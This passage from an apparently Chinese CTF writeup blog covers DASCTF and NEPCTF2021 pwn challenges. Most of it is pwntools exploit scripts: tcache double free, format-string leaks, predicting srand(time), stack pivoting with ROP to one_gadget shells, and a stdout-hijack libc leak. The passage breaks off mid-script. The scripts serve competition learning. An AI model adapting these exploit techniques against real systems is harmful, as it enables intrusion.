class="built_in">str</span>(idx)) </span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input your child&#x27;s description:\n&quot;</span>)</span><br><span class="line">    p.send(desc)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./hook.so&quot;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">main_arean = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;main_arean:&quot;</span>+<span class="built_in">hex</span>(main_arean))</span><br><span class="line">libc_base = main_arean - <span class="number">0x1ebbe0</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">environ = libc_base + libc.symbols[<span class="string">&quot;__environ&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;environ:&quot;</span>+<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">open_addr=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts=libc_base+libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12_ret=libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">leave_ret = libc_base+<span class="number">0x000000000005aa48</span></span><br><span class="line">gadget=libc_base+<span class="number">0x157D8A</span><span class="comment">#0x157BFA</span></span><br><span class="line">log.info(<span class="string">&quot;gadget:&quot;</span>+<span class="built_in">hex</span>(gadget))</span><br><span class="line">add_rsp_0x18_ret=libc_base+<span class="number">0x000000000003794a</span></span><br><span class="line">ret=libc_base+<span class="number">0x0000000000025679</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">0</span>)   <span class="comment">#add tcache number</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">menu(<span class="number">666</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gender:&quot;</span>)</span><br><span class="line">tcache_struct = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;tcache_struct:&quot;</span>+<span class="built_in">hex</span>(tcache_struct))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Girl:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment"># double free tcache</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">edit_name(<span class="number">7</span>,p64(tcache_struct)[:<span class="number">7</span>])</span><br><span class="line">add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)    <span class="comment">#tcache struct</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x7000000000000</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(environ-<span class="number">0x10</span>)[:<span class="number">7</span>]</span><br><span class="line">edit_description(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># lead steak</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">stack_leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.info(<span class="string">&quot;stack_leak:&quot;</span>+<span class="built_in">hex</span>(stack_leak))</span><br><span class="line">main_ret = stack_leak - <span class="number">0x100</span></span><br><span class="line">log.info(<span class="string">&quot;main_ret:&quot;</span>+<span class="built_in">hex</span>(main_ret))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijact main_ret</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x7000000000000</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(main_ret-<span class="number">0x10</span>)[:<span class="number">7</span>]</span><br><span class="line">edit_description(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit_description(<span class="number">3</span>,<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi_ret)+p64(tcache_struct+<span class="number">0x9e0</span>)  <span class="comment">#&quot;flag&quot; in chunk0</span></span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">4</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)</span><br><span class="line">payload+=p64(tcache_struct+<span class="number">0x9f0</span>)</span><br><span class="line">payload+=p64(pop_rdx_r12_ret)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(tcache_struct+<span class="number">0x9f0</span>)</span><br><span class="line">payload+=p64(puts)</span><br><span class="line"></span><br><span class="line">edit_description(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0x19D4)&quot;)</span></span><br><span class="line">menu(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Writeup-汇总"><a href="#Writeup-汇总" class="headerlink" title="Writeup 汇总"></a>Writeup 汇总</h2><p><a href="https://shimo.im/docs/V1hLlJ0RoRkI7Si9">https://shimo.im/docs/V1hLlJ0RoRkI7Si9</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> DASCTF </tag>
            
            <tag> 沙盒堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NEPCTF2021 Writeup</title>
      <link href="archives/bdb75c49/"/>
      <url>archives/bdb75c49/</url>
      
        <content type="html"><![CDATA[<h2 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h2><p>main 函数退出时会调用 buf[2] 里面的函数：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321215907.png" alt="image-20210321215903208"></p><p>调试看到里面存在的值，是众多错误提示中的一个：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321220336.png" alt="image-20210321220334619"></p><p>程序存在后门，地址为：0x14E1</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321220646.png" alt="image-20210321220645329"></p><p>由于开启了 PIE 保护，只有最后3位不变，需要爆破倒数第 4 位。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/bin/cat /flag&quot;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">&quot;\xe1\xa4&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">p = process(<span class="string">&quot;./xhh&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0x1721)&quot;)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">flag = p.recv()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">log.info(<span class="string">&quot;flag:&quot;</span>+flag)</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.close()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h2 id="scmt"><a href="#scmt" class="headerlink" title="scmt"></a>scmt</h2><p>格式化字符串泄露 token ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321221114.png" alt="image-20210321221113130"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./scmt&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">37597</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x400B32&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;skye%8$p&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;skye&quot;</span>)</span><br><span class="line">token = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;token:&quot;</span>+<span class="built_in">hex</span>(token))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;number:\n&quot;</span>)</span><br><span class="line">payload = <span class="built_in">str</span>(token)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h2><p>以当前时间设置随机种子：<code>srand(time)</code> ，输入与生成随机数相同 getshell ，那个 scanf 溢出没用到</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210321221625.png" alt="image-20210321221607148"></p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><p>不会写 python 随机数生成，曲线救国了一下：</p><ol><li><p>用 python 获取<strong>当前时间+ 1min</strong> 的时间戳</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#filename:get_timecode.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">int</span>(time.time())+<span class="number">60</span><span class="comment">#timecode</span></span><br></pre></td></tr></table></figure></li><li><p>用 c 设置随机种子并生成随机数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#filename:time_random.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    srand(<span class="number">1616233265</span>);<span class="comment">//timecode</span></span><br><span class="line">    a = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">648729124</span>)<span class="comment">#time_random</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment"># p = process(&quot;./easystack&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">39669</span>)</span><br><span class="line"><span class="comment"># p.recvuntil(&quot;!!\n&quot;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">flag = p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">print(flag)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.close()</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><p>输入 name 有一个 sprintf 存在格式化字符串漏洞：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210323225324.png" alt="image-20210323225253144"></p><p>修改 main 函数的 rbp 最后一个字节为 <code>\x00</code> ，也可以其他，对齐 0x8 就行。有几率刚好撞上 main 函数中输入的 teamname ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210323225541.png" alt="image-20210323225539892"></p><p>由于 teamname 长度限制需要先栈迁移再泄露 libc &amp; 写入下一步 ROP 。</p><p>迁移后泄露地址，有了 libc 地址，构造 getshell 。尝试 system(‘/bin/sh’) 报错，用 onegadget 可以。</p><p>人品极差就会卡在奇奇怪怪地方循环，或者直接崩掉</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210323231612.png" alt="easypwn循环"></p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./easypwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./easypwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400be3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400be1</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x00000000004007c8</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400a1f</span></span><br><span class="line">bss = <span class="number">0x602080</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;teamname: &quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x400940&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x400AE8&quot;)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(bss+<span class="number">0x350</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(bss+<span class="number">0x350</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27;*0x50</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;%22$hhn&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;introduction\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.4</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(bss+<span class="number">0x250</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(bss+<span class="number">0x250</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts_addr = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_str = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(pop_rdi_ret) + p64(binsh_str)</span></span><br><span class="line"><span class="comment"># payload += p64(system_addr)</span></span><br><span class="line"></span><br><span class="line">payload = p64(libc_base + <span class="number">0x4f432</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="sooooeasy"><a href="#sooooeasy" class="headerlink" title="sooooeasy"></a>sooooeasy</h2><p>libc2.23 uaf 没有输出功能。攻击 _IO_2_1_stdout 结构体来实现 libc 地址泄露：通过低字节覆盖 unsorted bin 留下的 main_arena 指针，再加以爆破 4 位，就能分配到 _IO_2_1_stdout ，通过篡改 _IO_2_1_stdout 的 flags 为 0x0FBAD1887 ，_IO_write_base 低字节覆盖，然后当程序调用 puts 输出任意信息时，就会输出 _IO_write_base 到 _IO_write_ptr 之间的数据，而这之间就有 libc 的指针。</p><blockquote><p>劫持 stdout 泄露 libc 地址方法原理：</p><p><a href="https://blog.csdn.net/seaaseesa/article/details/105590591">https://blog.csdn.net/seaaseesa/article/details/105590591</a></p><p><a href="http://blog.eonew.cn/archives/1190">http://blog.eonew.cn/archives/1190</a></p></blockquote><h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><p>一开始又遇到堆数量达到上限，可以调整减少堆数量，官网 wp 通过释放两次同一个堆触发 malloc_hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,message</span>):</span></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: \n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message:\n&quot;</span>)</span><br><span class="line">p.sendline(message)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">command(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;c&#x27;</span>*<span 